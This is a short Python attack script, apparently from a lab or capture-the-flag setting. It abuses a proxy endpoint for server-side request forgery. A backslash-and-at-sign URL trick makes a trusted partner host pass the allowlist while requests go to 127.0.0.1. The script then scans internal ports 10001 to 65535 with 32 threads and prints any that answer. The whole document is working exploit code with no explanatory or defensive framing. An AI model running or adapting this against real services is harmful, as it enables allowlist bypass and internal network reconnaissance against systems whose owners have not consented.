import requests, concurrent.futures as cf
P="http://127.0.0.1:24606/api/proxy"
S=requests.Session()
def probe(p):
    u=f"http://rates.partner-forex.example.com\\@127.0.0.1:{p}/"
    try:
        r=S.get(P, params={"url":u}, timeout=4)
        if "upstream unreachable" not in r.text:
            return (p,"RESP",r.status_code,r.text[:80].replace("\n"," "))
    except Exception as e:
        return (p,"EXC",type(e).__name__)
    return None
res=[]
with cf.ThreadPoolExecutor(max_workers=32) as ex:
    for o in ex.map(probe, range(10001,65536)):
        if o:
            res.append(o); print(o,flush=True)
print("DONE",res,flush=True)
